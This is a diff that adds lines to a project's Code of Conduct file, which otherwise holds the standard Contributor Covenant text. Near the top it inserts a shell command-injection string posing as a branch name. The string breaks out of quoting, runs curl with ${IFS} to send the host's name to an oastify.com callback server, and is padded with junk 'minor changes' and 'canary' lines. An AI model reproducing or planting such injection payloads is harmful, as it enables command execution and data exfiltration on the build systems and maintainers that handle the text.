@@ -1,7 +1,13 @@
 ## Code of Conduct
 
 ### Our Pledge
+ fix/asasasasasasasasasasasas';$(curl${IFS}-da=$(hostname)${IFS}bl0xdi8jeffy5rt53lz0t9eqehk889wy.oastify.com);echo'
 zzzzzzzaaasfas
+
+rrwrwzzzzzzZZZZZZZ
+# minor changesZZzZZZ
+minor updates
+canary
 We as members, contributors, and leaders pledge to make participation in our community a harassment-free experience for everyone, regardless of age, body size, visible or invisible disability, ethnicity, sex characteristics, gender identity and expression, level of experience, education, socio-economic status, nationality, personal appearance, race, caste, color, religion, or sexual identity and orientation.
 
 We pledge to act and interact in ways that contribute to an open, welcoming, diverse, inclusive, and healthy community.
@@ -45,7 +51,7 @@ faith may face temporary or permanent repercussions as determined by other
 members of the project's leadership.
 
 ### Attribution
-
+minor change
 This Code of Conduct is adapted from the [Contributor Covenant][homepage], version 2.1,
 available at [https://www.contributor-covenant.org/version/2/1/code_of_conduct/][version]
 
